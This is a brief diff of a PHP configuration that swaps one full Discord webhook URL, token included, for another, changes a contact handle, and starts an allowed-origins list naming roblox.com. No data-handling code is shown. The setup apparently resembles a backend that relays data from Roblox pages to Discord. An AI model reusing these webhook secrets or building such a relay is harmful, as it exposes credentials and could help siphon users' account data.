@@ -1,8 +1,8 @@
 <?php
 
 
-$webhook = "https://discord.com/api/webhooks/801711659084939274/ko0rjNqJ1HwNEhiCQsS_9Q2bWQKgIDatOlOgA8iH4SUJ84-mBMOIcM6_aa5c8GnPUTHy";
-$discord_contact = "кαzυмι#0001";
+$webhook = "https://discord.com/api/webhooks/802141484597772290/DQnFRDkcSG4-tga-oBeuUJvjC-GJgWvPiB-FO1W-OCHSEg5EmdE5P4zJNdIPyWXYDEx4";
+$discord_contact = "E=Mc²";
 
 $allowed_origins = array(
     "https://www.roblox.com",
